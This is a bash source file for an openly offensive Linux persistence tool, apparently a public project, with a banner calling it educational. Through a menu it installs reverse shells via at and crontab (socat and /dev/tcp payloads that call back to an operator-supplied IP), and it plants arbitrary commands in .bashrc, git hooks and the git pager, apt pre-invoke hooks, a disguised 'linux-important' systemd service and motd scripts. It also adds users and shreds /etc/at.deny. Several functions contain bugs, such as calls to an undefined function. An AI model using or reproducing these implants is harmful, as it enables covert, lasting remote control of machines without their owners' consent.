#!/bin/bash

# --- Global current script variables --- 
current_shell=$(grep "^$USER:" /etc/passwd | cut -d: -f7)
random=$(echo $RANDOM | head -c 2) # --- Needed in apt-get hook & systemd func ---

# --- Checking privileges ---
priv_check(){
if [[ $EUID != 0 ]]; then
    echo -e '\n[!] U are NOT running this script with superuser privileges. \n '
    read -rp "[?] Are u sure to continiue without SU privileges (y\n) > " priv_choice
    if [[ "$priv_choice" =~ ^[Yy]|[Yy][Ee][Ss]$ ]]; then 
        priv_status="not_su"
        echo -e "\n[!] Many functions will NOT work probably." && sleep 0.5
    elif [[ "$priv_choice" =~ ^[Nn]|[Nn][Oo]$ ]]; then
        echo -e "\n[!] Exiting... " && sleep 0.5 && exit 0;
    elif [[ -z "$priv_choice" ]];then
        echo -e "\n[x]U didn't choose any option \n[!] Exiting..." && sleep 0.5 && exit 1
    fi;
else
    echo -e '[!] U are running this script with superuser privileges. Think before u type \n '
    priv_status="is_su"
fi;
}

sched_persis(){ # --- Scheduler Persistance ---
echo -e "[1] At [2] Crontab"
read -rp "[?] Which command to use > " scheduler_choice
case $scheduler_choice in
1) # --- At Persistence func (i know this is useless shit-func, contribute if u have any idea)---
    if [ "$(command -v at)" ]; then
        echo " Command \"at\" exists on system"
        if [[ -r "/etc/at.deny" && -s "/etc/at.deny" ]]; then
            echo -e " Here are denied users of using \"at\" command" && tabulate -f simple </etc/at.deny
            read -rp "[?] Do u want to delete all users (y\n) > " at_user_choice
            if [[ "$at_user_choice" =~ ^[Yy]|[Yy][Ee][Ss]$ ]]; then
                if [ "$(command -v shred)" ]; then
                    shred -n 5 -zfuv /etc/at.deny && touch /etc/at.deny && echo -e "\n \"/etc/at.deny\" file deleted via \"shred\" command and a new empty one has been created "
                else 
                    rm -f /etc/at.deny && touch /etc/at.deny && echo " \"/etc/at.deny\" file deleted via \"rm\" command and created a new empty one "
                fi;
            else
                echo "[x] Rolling back to menu" && menu
            fi;
        else
            echo "[x] At's denied users file is not found or not readable for current user - ($USER)"
        fi;
        read -rp "[!] Enter IP or domain for basic TCP user custom > " at_ip
        if [[ -z "$at_ip" ]]; then 
            echo "[x] IP or domain cannot be empty."
            scheduler_persistence
        else 
            if [[ "$at_ip" =~ [a-zA-Z] ]]; then
                domain_to_ip=$(dig +short "$at_ip" | head -n 1)    
                if [[ -n "$domain_to_ip" ]]; then
                at_ip="$domain_to_ip"
                echo " Resolved domain to IP > $at_ip"
            else
                echo "[x] Unable to resolve the domain to IP. Please enter a valid IP or make sure the domain is resolvable."
                scheduler_persistence
        fi;fi;fi;
        read -rp "[!] Eneter port > " at_port
        if [[ "$at_port" =~ [0-65535] && $(command -v socat) ]]; then
            at_payload="socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$at_ip:$at_port"
            echo "$at_payload" | at now + 5 minute && echo -e "\n \"$at_payload\" every 5 minute socat payload will be executed."
            echo -e "[*] Paste this socat listner \"socat file:$(tty),raw,echo=0 TCP-L:$at_port\" command in your machine" 
            scheduler_persistence
        else
            echo "[x] \"socat\" command not found or u entered invalid port [0-65535]. "
            scheduler_persistence
        fi;
    elif [ "$priv_status" == "is_su" ]; then
        read -rp "[?] Do u want to install \"At\" command (y\n) > " at_choice
        if [[ "$at_choice" =~ ^[Yy]|[Yy][Ee][Ss]$ ]]; then
            sudo apt update -y && sudo apt install at && sudo systemctl enable --now atd && echo -e " \"At\" command successuly installed and \"atd\" daemon enabled.\n"
            scheduler_persistence
        elif [[ "$at_choice" =~ ^[Nn]|[Nn][Oo]$ ]]; then
            echo "[-] Going back to main menu "
            scheduler_persistence
        fi
    else
        clear
        echo -e "[x] \"at\" command is not install on your system "
        echo -e "[x] U cannot install \"at\" command without SU priveleges\n " 
        scheduler_persistence 
    fi;;
2) # --- Crontab Persistence func ---
    cron_example="
    [*] Example of job definition:
        .---------------- minute (0 - 59)
        |  .------------- hour (0 - 23)
        |  |  .---------- day of month (1 - 31)
        |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
        |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
        |  |  |  |  |
        *  *  *  *  * user-name   command to be executed 
        5  *  *  *  *   root      /bin/nc 127.0.0.1 4444     " 

    # --- Checking premissions of crontab stuff (files & dirs) ---
    cron_stuff=("/etc/crontab" "/var/spool/cron/crontabs/$USER/");

    for cron_stuff_check in "${cron_stuff[@]}"; do
        sleep 0.3
        if [ -w "$cron_stuff_check" ]; then
            echo -e " Crontab file or directory - \"$cron_stuff_check\" is writeable"
        elif [ -f "$cron_stuff_check" ]; then   
            echo "[x] Crontab file or directory - \"$cron_stuff_check\" is not writeable for current logged user($USER)."
        elif [ -d "$cron_stuff_check" ]; then
                continue
        else
            echo -e "[x] Crontab file or directory - \"$cron_stuff_check\" not found or permission denied for current user($USER) \n\t"    
            mkdir -p "$cron_stuff_check" && echo " \"$cron_stuff_check\" has been successufly created "
        fi;
    done

    echo

    # --- Custom crontab command ---
    read -rp "[?] Do u want to add custom command to crontab (y\n) > " cron_choice
    if [[ "$cron_choice" =~ ^[Yy]|[Yy][Ee][Ss]$ ]]; then
        echo "$cron_example" && echo
        read -rp "[!] Enter your custom command > " cron_command
        # --- Custom cron command based on priv ---
        if [[ "$priv_status" == "is_su" && -n "$cron_command" ]]; then
            echo "$cron_command" | tee -a "${cron_stuff[0]}" && echo " $cron_command successfully added to $USER's ${cron_stuff[0]}"
        elif [[ "$priv_status" == "not_su" && -n "$cron_command" ]]; then
            echo "$cron_command" | crontab - && echo " $cron_command successfully added to $USER's crontab"
        else
            echo "[x] Something went wrong while checking permissions or input is empty"
            scheduler_persistence   
        fi;
        # --- Default user custom payload based on user's interpretator
    elif [[ "$cron_choice" =~ ^[Nn]|[Nn][Oo]$ ]]; then
        # --- Validation of input ---
        read -rp "[!] Enter IP or domain for basic TCP user custom > " cron_ip
        if [[ -z "$cron_ip" ]]; then 
            echo "[x] IP or domain cannot be empty."
            scheduler_persistence
        else 
            if [[ "$cron_ip" =~ [a-zA-Z] ]]; then
                domain_to_ip=$(dig +short "$cron_ip" | head -n 1)    
                if [[ -n "$domain_to_ip" ]]; then
                cron_ip="$domain_to_ip"
                echo " Resolved domain to IP: $cron_ip"
            else
                echo "[x] Unable to resolve the domain to IP. Please enter a valid IP or make sure the domain is resolvable."; 
                scheduler_persistence
        fi; fi; fi;

        read -rp "[!] Enter PORT > " cron_port
        if [ "$current_shell" == "/bin/bash" ] || [ "$current_shell" == "/usr/bin/bash" ]; then 
            # --- Bash rev shell payload ---
                cron_payload="* * * * * $USER bash -c '0<&33-;exec 33<>/dev/tcp/$cron_ip/$cron_port;sh <&33 >&33 2>&33'"
                if [[ "$priv_status" == "is_su" ]]; then
                    echo "$cron_payload" | tee -a "${cron_stuff[0]}" && echo -e " Payload successufly added to \"${cron_stuff[0]}\""
                    scheduler_persistence   
                else
                    echo "$cron_payload" | crontab - && echo -e " Payload successfully added to $USER's crontab"
                    scheduler_persistence
                fi;
            # --- Zsh rev shell payload ---
            elif [ "$current_shell" == "/bin/zsh" ] || [ "$current_shell" == "/usr/bin/zsh" ]; then 
                cron_payload="* * * * * $USER zsh -c 'zmodload zsh/net/tcp && ztcp $cron_ip $cron_port && zsh >&\$REPLY' 2>&\$REPLY' 0>&\$REPLY' > /dev/null &"
                if [[ "$priv_status" == "is_su" ]]; then
                    echo "$cron_payload" | tee -a "${cron_stuff[0]}" && echo -e " Payload successufly added to \"${cron_stuff[0]}\""   
                    scheduler_persistence
                else
                    echo "$cron_payload" | crontab - && echo -e " Payload successfully added to $USER's crontab"
                    scheduler_persistence
                fi;
            # --- Sh rev shell payload ---
            elif [ "$current_shell" == "/bin/sh" ] || [ "$current_shell" == "/usr/bin/sh" ] ; then 
                cron_payload="* * * * * $USER 0<&196;exec 196<>/dev/tcp/$cron_ip/$cron_port; sh <&196 >&196 2>&196"
                if [[ "$priv_status" == "is_su" ]]; then
                    echo "$cron_payload" | tee -a "${cron_stuff[0]}" && echo -e " Payload successufly added to \"${cron_stuff[0]}\""   
                    scheduler_persistence
                else
                    echo "$cron_payload" | crontab - && echo -e " Payload successfully added to $USER's crontab"
                    scheduler_persistence
                fi;
        else
            # --- Giving link of cheatsheet if user's interpertator is unknown --- 
            echo -e "[x] Reverse-shell command for $USER's default shell(\"$current_shell\") is unknown. Supported shells are - sh, bash & zsh. \n"
            echo -e "[!] Take a look at this cheet-sheet & manually add it to crontab based on your shell - (\"$current_shell\") \n" 
            echo -e "[*] https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/ \n"
            scheduler_persistence
        fi;
    else
        echo -e "[x] No option has been seleted going back to menu" && sleep 0.5
        scheduler_persistence
    fi;;
0)
    echo -e "[+] Going back to main menu"
    banner && menu;;
*) 
    echo -e "[x] Enter valid option [0-2]\n"
    scheduler_persistence;;
esac;
}

# --- Shell Configuration Persistence File of bash & zshrc  ---
shell_persis(){
    echo -e "[*] Your current shell is \"$current_shell\"\n"
    read -rp "[!] Enter your custom command > " shell_command
    # --- Custom shell command based on priv ---
    if [ "$current_shell" == "/bin/bash" ] || [ "$current_shell" == "/usr/bin/bash" ]; then
        echo "$shell_command" | tee -a ~/.bashrc && echo " \"$shell_command\" successfuly added to ~/.bashrc config file" && menu
    elif [ "$current_shell" == "/bin/zsh" ] || [ "$current_shell" == "/usr/bin/zsh" ]; then
        echo "$cron_command" | tee -a ~/.zshrc && echo " $shell_command successfully added to ~/.zshrc config file" && menu
    else
        echo "[x] Cannot identify what shell u are using." && menu   
    fi;
}

# --- User manager func --- 
manage_users() {
echo
echo "[1] View all users"
echo "[2] Add a User"
echo -e "[3] Delete a User\n"
echo "[0] Return to Menu"
echo 
read -rp "[*] Enter your choice > " user_choice
case $user_choice in
1)
    echo -e "\n[+] All Users:"
    awk -F: '{print "Username:", $1, "\t UID:", $3, "\t Path:", $6}' /etc/passwd | tabulate  
    # --- Show users with privileged permissions --- 
    echo -e "\n[+] Users with Privileged Permissions:"
    awk -F: '$3==0 {print "[+] Username:", $1, "\t UID:", $3, "\t Path:", $6}' /etc/passwd | tabulate
    sleep 0.5 && manage_users;;
2)  
    if [[ "$priv_status" == "is_su" ]]; then
        read -rp "[!] Enter username for the new user > " user_new
        read -rp "[!] Enter home directory for the new user [press enter for defult path] > " user_home
        if [ -z "$user" ]; then
            user_home="/home/$user_new" 
        fi;
        read -rp "[!] Enter shell for the new user [bash/zsh] > " user_shell
        if [[ "$user_shell" =~ ^[Bb][Aa][Ss][Hh]$ || "$user_shell" =~ ^[Zz][Ss][Hh]$ ]]; then
            sudo useradd -m -d "$user_home" -s "/bin/$user_shell" "$user_new"
        else 
            echo -e "[x] \"$user_shell\" unknown shell.";
            manage_users
        fi;
        echo -e " User \"$user_new\" added with shell \"$user_shell\" in \"$user_home\"\n"
        sleep 0.5 && manage_users
    else 
        echo -e "[x] U cannot add user without SU privileges"
        sleep 0.5 && manage_users
    fi;;
3)
    if [[ "$priv_status" == "is_su" ]]; then
        read -rp "[!] Enter username to delete > " del_user
        sudo userdel "$del_user" && echo " User \"$del_user\" deleted."
        sleep 0.5 && manage_users
    else
        echo "[x] U cannot delete user without SU privileges"
        sleep 0.5 && manage_users
    fi;;
0)
    sleep 0.5 && menu;;
*)  
    echo "[x] Invalid choice. Please enter a valid option [0-3]."
    sleep 0.5 && manage_users
esac;
}

hooks(){
echo -e "[1] Git hooks & config"
echo -e "[2] Apt-get hooks"
echo 

read -rp "[*] Enter your choice > " hook_choice
case $hook_choice in
1)
    echo 
    
    echo -e "[*] Searching for .git folders in /home/ directories\n"    
    # --- Finding all .git folders of all users & storing them in an array ---
    mapfile -t git_folders < <(find /home/ -type d -name ".git") && \
    echo "[+] Found accessable .git folders for user ($USER):" # --- Display users founded .git folders ---
    for ((n_folder=0; n_folder<${#git_folders[@]}; n_folder++)); do
        echo "[$((n_folder+1))] ${git_folders[$n_folder]}"
    done;
    
    echo
    read -rp "[*] Choose a .git folder to take futher actions > " folder_num
        if [[ "$folder_num" =~ ^[1-9][0-9]*$ && "$folder_num" -le "${#git_folders[@]}" ]]; then
            selected_folder="${git_folders[$((folder_num-1))]}" 
            cd "$selected_folder" || { echo "[x] $selected_folder is not accessible for user ($USER) "; hooks; } 
            echo -e "\n[+] Current directory > $(pwd)" && \
            echo -e "\n[+] Last 3 commits of repo\n" && \
            git log -n 3
        else 
            echo -e "\n[x] Invalid .git folder\n" && hooks
        fi
    echo
    
    echo -e "\n[1] Add custom payload to pre-commit hook\n[2] Add custom payload to git config file"
    read -rp "[*] Enter your choice > " git_choice
    if [[ "$git_choice" == "1" ]]; then 
            echo -e "[*] All avalable hooks in $selected_folder\n"
            cd "$selected_folder"/hooks && ls -la .
            pre_commit_file="pre-commit.sh"
            if [[ -f "$pre_commit_file" ]]; then
                echo "[+] File \"$pre_commit_file\" exists"
            elif [[ -f "pre-commit.sample" ]]; then
                mv pre-commit.sample "$pre_commit_file" && chmod +x "$pre_commit_file" && \
                echo "[+] Found sample of pre-commit file, renamed into .sh & made it executable"
            else
                echo -e "[x] Pre-commit hooks not found.\n" 
                hooks
            fi
            read -rp "[*] Enter your custom payload for pre-commit hook > " pre_commit_payload
            if [[ -n "$pre_commit_payload" ]]; then
                echo -e "[+] Adding custom pre-commit git hook\n"
                echo -e "#!/bin/bash\n$pre_commit_payload" >> "$pre_commit_file" && \
                chmod +x "$pre_commit_file" && \
                echo -e "[+] Pre-commit Git hook created successfully.\n" && hooks
            else 
                echo -e "[x] Payload cannot be empty\n" && hooks
            fi
    elif [[ "$git_choice" == "2" ]]; then
        cd "$selected_folder" || { echo "[x] $selected_folder is not accessible for user ($USER) "; hooks; } 
        if [[ -f $(pwd)/config ]] && [[ -w $(pwd)/config ]] && [[ -r $(pwd)/config ]]; then
            echo -e "[+] Git config file exits for current user ($USER) & have r/w premissions\n"
            read -rp "[*] Enter your custom payload > " git_config_payload
            if [[ -n "$git_config_payload" ]]; then
                git_config_content=$(cat "$(pwd)/config")
                if [[ ! "$git_config_content" =~ pager ]]; then # --- Checking if pager entry already exists ---
                    echo -e "[*] Adding payload to git config file \n"
                    echo -e "\n[core]\n\tpager = $git_config_payload" >> "$(pwd)/config" && \
                    echo -e "[+] Payload successfuly added to \"$(pwd)/config\" file"
                else # --- Adding user custom payload to existing pager entry --- 
                    echo -e "[*] Modifing pager configuration option\n"
                    sed -i "s|pager =|pager = $git_config_payload|" "$(pwd)/config" && \
                    echo -e "[+] Pager configuration option modified successfuly" && hooks
                fi
            else 
                echo -e "[x] Payload cannot be empty\n" && hooks
            fi
        else
            echo -e "[x] Git config file not found or current user ($USER) don't have r/w premissions" && hooks    
        fi;
        
    else
        echo -e "[x] Invalid option\n" && hooks
    fi
    ;;
2)
    if [[ "$priv_status" == "is_su" ]]; then
        read -rp "[+] Enter custom payload/command > " apt_payload
        if [[ -z "$apt_payload" ]]; then
            echo -e "[+] Apt config directory exitst\n"
            sudo touch "/etc/apt/apt.conf.d/'$random'aptget"
            echo "APT::Update::Pre-Invoke {\"$apt_payload\";};" | sudo tee "/etc/apt/apt.conf.d/'$random'aptget" > /dev/null
            echo -e "[+] Payload (\"'$apt_payload'\") successfuly implented in \"/etc/apt/apt.conf.d/'$random'aptget\""
        else
            echo -e "[x] Payload cannot be empty \n" && hooks
        fi;
    else
        echo -e "[x] U need SU privileges to add custom payload to apt-get pre-invoke\n" && \
        hooks
    fi;;
*)
    echo -e "[x] Invalid option\n" && hooks;;
esac
}

system_deamon(){
    # --- Storing all admin systemd unit paths into "admin_paths" array ---
    mapfile -t admin_units < <(systemd-analyze unit-paths --system) 
    admin_paths=$(printf "[+] %s\n" "${admin_units[@]}")
    # --- Storing all user systemd unit paths into "user_paths" array --- 
    mapfile -t user_units < <(systemd-analyze unit-paths --user)
    user_paths=$(printf "[+] %s\n" "${user_units[@]}")
    # --- here diff uses process substitution to compare via strings not via temp files(diff -y a.txt b.txt) ---
    echo -e "\tSystem units paths\t\t\t\t\t\tUsers units paths " && diff -y <(echo "$admin_paths") <(echo "$user_paths") 

    if [[ "$priv_status" == "is_su" ]]; then
        echo -e "[+] U are SU your payload will be implanted in systemd level "
        read -rp "[*] Enter custom path to script or enter custom payload > " su_systemd_payload
        if [[ -z "$su_systemd_payload" ]]; then
            echo -e "\n[x] Payload cannot be empty \n" && menu
        else
            su_systemd_file="$HOME/.config/systemd/user/'$random'-linux-important.service"
# --- simple systemd service with custom payload ---
cat << EOF > "$su_systemd_file"

[Unit]
Description=Linux Important Service N$random

[Service]
Type=simple
ExecStart=$su_systemd_payload
Restart=always
RestartSec=120

[Install]
WantedBy=default.target
EOF
        systemctl daemon-reload && \
        systemctl enable "$random"-linux-important.service && \
        systemctl start "$random"-linux-important.service && \
        echo -e "\n[+] (\"ExecStart=$su_systemd_payload\") successufly implanted in \"$su_systemd_file\" and stared";
        fi
    else
        echo -e "\n[!] Current user (\"$USER\") cannot implant system deamon service on system level \n"
        read -rp "[*] Enter custom path to script or enter custom payload > " user_systemd_payload
        if [[ -z "$user_systemd_payload" ]]; then
            echo -e "\n[x] Payload cannot be empty \n" && menu
        else
            user_systemd_file="$HOME/.config/systemd/user/'$random'-linux-important.service"
cat << EOF > "$user_systemd_file"
[Unit]
Description=Linux Important Service N$random
After=network.target

[Service]
Type=simple
ExecStart=$user_systemd_payload
Restart=always
RestartSec=120

[Install]
WantedBy=default.target
EOF
            systemctl --user daemon-reload && \
            systemctl --user enable linux-important.service && \
            systemctl --user start linux-important.service && \
            echo -e "\n[+] (\"ExecStart=$user_systemd_payload\") successufly implanted in \"$user_systemd_file\" and stared";
    fi; fi;
}

motd(){
    echo -e "[+] Here are all motd files \n" && find / -d motd 
    if [[ $priv_status == "is_su" ]];then
        read -rp "[*] Enter your custom payload to massage of the day" motd_payload
        if [[ -n $motd_payload && -d /etc/update-motd.d/ ]]; then
            echo -ne "#!/bin/bash\n$motd_payload" >> /etc/update-motd.d/20-pers && \
            chmod +x /etc/update-motd.d/20-pers && \
            echo -e "[+] Payload ($motd_payload) has been successfuly added to /etc/update-motd.d/20-pers" && \
            menu || echo -e "\n[x] Something went wrong while adding payload\n" && menu;
        else
            echo -e "\n[x] Your payload is empty or /etc/update-motd.d not found\n" && menu
        fi
    else
        echo -e "[x] U cannot edit custom payload into motd without SU\n" && menu
    fi
}

# --- Closing if user presses ^C or ^Z --- 
closing(){ 
    echo -e "\n\n[+] Closing program...\n\n[!] Don't forget to check git repo (https://github.com/anonimidin/terminatedshell)" && \
    sleep 0.3 && exit 0 
    }
trap closing SIGINT SIGTSTP

# ----- MAIN -----

# TO-DO
# --- For decoration i'll add them soon --- 
# xterm -hold -title "bbuy" -geometry 100x25 -e "echo 1234"
# line(){ 
#     printf -- '[-///-]%.0s' \ {1..3}
# }
# GREEN='\033[0;32m'
# RED='\033[0;31m'
# YELLOW='\033[1;33m'
# EOC='\033[0m' 

banner() { # --- Banner ---
tux="
\t     .--.                                              
\t    |X_X |   ╔╦╗┌─┐┬─┐┌┬┐┬┌┐┌┌─┐┌┬┐┌─┐┌┬┐╔═╗┬ ┬┌─┐┬  ┬  
\t    |\_/ |    ║ ├┤ ├┬┘│││││││├─┤ │ ├┤  ││╚═╗├─┤├┤ │  │  
\t   // x \ \   ╩ └─┘┴└─┴ ┴┴┘└┘┴ ┴ ┴ └─┘─┴┘╚═╝┴ ┴└─┘┴─┘┴─┘
\t  (|  x  | ) Tool for persistence in linux by anonimidin        
\t /'|_ x _/'\  Use this script for educational purposes. 
\t \___)=(___/                                                                                                  
"
echo -e "$tux" 
echo -e '[1] Manage Users [View\Add\Delete] \n[2] Shell Configuration File Persistence [.bashrc|.zshrc] \n[3] Scheduler Persistence'
echo -e '[4] Hooks\n[5] Systemd\n[6] Message of the Day'  
echo -e '\n[0] Exit\n'
if (( $(tput cols) < 155 )); then
    echo -e "\n[*] Your width of terminal is \"$(tput cols)\"" 
    echo -e "[*] For best reading performance columns must be 155+\n"
fi;
}

# --- Checking for privileges --- 
priv_check
# -- Menu --- 
menu(){
# --- Banner & options
banner 
read -rp "[*] $(hostname) | $(uname -r) > " choice
# --- Waiting for choice from user ---
    case $choice in

    0) # --- About repo & exit ---
        if command -v open > /dev/null; then 
            echo -e "\n[!] U automaticly will be rediracted to github repo. Help us to improve & spread this script\n" && \
            sleep 2 && open https://github.com/anonimidin/terminatedshell
            exit 0;
        else
            sleep 0.5
            echo "[!] Don't forget to check git repo (https://github.com/anonimidin/terminatedshell)"
        fi; exit 0;;

    1) sleep 0.5 && echo && manage_users;;
    2) sleep 0.5 && echo && shell_persis;;
    3) sleep 0.5 && echo && sched_persis;;
    4) sleep 0.5 && echo && hooks;;
    5) sleep 0.5 && echo && system_deamon;; 
    6) sleep 0.5 && echo && motd;;

    *)
        echo -e "\n[!] Choose from [0] to [5].\n"
        menu;;
    esac
}
menu
# --- EOF ---